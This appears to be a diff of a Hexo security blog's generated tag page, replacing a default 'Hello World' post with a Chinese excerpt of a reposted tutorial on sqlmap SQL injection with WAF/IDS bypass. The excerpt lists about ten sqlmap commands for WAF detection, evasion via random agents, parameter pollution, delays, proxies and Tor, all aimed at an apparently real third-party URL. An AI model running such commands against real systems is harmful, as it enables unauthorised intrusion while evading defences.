@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="攻VS防，战略与战术！马拉松式工作！">
-    <title>Archiv: 2018/7 - 攻VS防，战略与战术！马拉松式工作！</title>
+    <title>Tag: sqlmap - 攻VS防，战略与战术！马拉松式工作！</title>
     <meta name="author" content="Lao k17">
     
         <meta name="keywords" content="hexo,javascript,安全,">
@@ -20,7 +20,7 @@
 <meta name="keywords" content="hexo,javascript,安全">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="攻VS防，战略与战术！马拉松式工作！">
-<meta property="og:url" content="http://s-sec.github.io/archives/2018/07/index.html">
+<meta property="og:url" content="http://s-sec.github.io/tags/sqlmap/index.html">
 <meta property="og:site_name" content="攻VS防，战略与战术！马拉松式工作！">
 <meta property="og:description" content="记录网络安全,渗透渗透,信息安全,代码审计,权限提升,脚本漏洞,无线安全,社会工程,安全文献,安全媒体。">
 <meta property="og:locale" content="zh-CN">
@@ -241,49 +241,41 @@
     <section class="postShorten-group main-content-wrap">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
+    <article class="postShorten postShorten--thumbnailimg-right">
         <div class="postShorten-wrap">
             
             <div class="postShorten-header">
                 <h1 class="postShorten-title">
                     
-                        <a class="link-unstyled" href="/2018/07/14/hello-world/">
-                            Hello World
+                        <a class="link-unstyled" href="/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/">
+                            使用sqlmap 绕过防火墙进行注入测试
                         </a>
                     
                 </h1>
                 <div class="postShorten-meta">
-    <time datetime="2018-07-14T23:39:14+08:00">
+    <time datetime="2017-03-02T15:13:48+08:00">
 	
-		    14 7月 2018
+		    02 3月 2017
     	
     </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/安全技术/">安全技术</a>
+
+
     
 </div>
 
             </div>
             
-                <div class="postShorten-content">
-                    <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
+                <div class="postShorten-excerpt">
+                    <p><strong>PS</strong>: 内容摘自煜铭2011的博客<a href="http://blog.csdn.net/qq_29277155，仅供传阅学习！" target="_blank" rel="noopener">http://blog.csdn.net/qq_29277155，仅供传阅学习！</a><br>0x00 前言<br>   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。<br>0x01 确认WAF<br>     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;</a> –thread 10 –identify-waf#首选<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –thread 10  –check-waf#备选<br>0x02 使用参数进行绕过<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –delay=3.5 –time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –proxy=211.211.211.211:8080 –proxy-cred=211:985#使用代理进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –ignore-proxy#禁止使用系统的代理，直接连接进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –flush-session#清空会话，重构注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hex#或者使用参数 –no-cast ，进行字符码转换<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –mobile #对移动端的服务器进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –tor # 匿名注入<br>0x03 使用脚本介绍<br>
                     
+                        <a href="/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" class="postShorten-excerpt_link link">
+                            Weiterlesen
+                        </a>
                         
-
-                    
-                    
-                        <p>
-                            <a href="/2018/07/14/hello-world/#post-footer" class="postShorten-excerpt_link link">
-                                Kommentieren und teilen
-                            </a>
-                        </p>
                     
                 </div>
             
@@ -300,7 +292,6 @@
 </div>
 
 </section>
-
 
 
                 <footer id="footer" class="main-content-wrap">
